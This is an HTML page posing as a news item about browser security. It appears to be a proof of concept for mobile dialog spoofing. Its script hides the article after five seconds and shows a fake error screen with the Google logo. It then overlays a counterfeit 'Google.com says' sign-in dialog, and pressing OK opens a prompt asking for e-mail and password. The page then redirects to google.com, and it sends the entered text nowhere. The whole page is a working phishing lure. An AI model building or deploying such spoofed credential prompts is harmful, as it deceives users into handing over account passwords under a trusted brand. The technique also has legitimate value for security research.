<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=no, interactive-widget=overlays-content">
<title>News</title>

<style>
body {
  font-family: system-ui, sans-serif;
  margin: 0;
  background: #f2f2f2;
}

#news {
  max-width: 700px;
  margin: 40px auto;
  background: #fff;
  padding: 24px;
  border-radius: 10px;
}

#error {
  display: none;
  position: fixed;
  inset: 0;
  background: #f2f2f2;
  text-align: center;
  padding-top: 20vh;
}

#overlay {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,.45);
}

#dialog {
  background: #fff;
  max-width: 420px;
  margin: 18vh auto;
  padding: 20px;
  border-radius: 24px;
}

.actions {
  text-align: right;
}
button {
  background: none;
  border: none;
  color: #1a73e8;
  font-size: 16px;
  margin-left: 12px;
}
</style>
</head>

<body>

<div id="news">
  <h1>Browser Security Update</h1>
  <p>
    Researchers discovered that web pages can visually imitate
    trusted browser dialogs on mobile devices.
  </p>
</div>

<div id="error">
  <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="120">
  <h2>An error has occurred</h2>
  <p>Please try again.</p>
</div>

<div id="overlay">
  <div id="dialog">
    <h3>Google.com says</h3>
    <p>Sign into your account to continue.</p>
    <div class="actions">
      <button onclick="hide()">Cancel</button>
      <button onclick="fakePrompt()">OK</button>
    </div>
  </div>
</div>

<script>
setTimeout(() => {
  news.style.display = "none";
  error.style.display = "block";

  setTimeout(() => {
    overlay.style.display = "block";
    document.body.style.overflow = "hidden";
  }, 1200);
}, 5000);

function hide() {
  overlay.style.display = "none";
  document.body.style.overflow = "auto";
}

function fakePrompt() {
  hide();

  setTimeout(() => {
    prompt(
      "Sign into your account to access this site",
      "E-mail / Password"
    );

    // Redirect to legitimate site after interaction
    location.href = "https://www.google.com";
  }, 300);
}
</script>

</body>
</html>
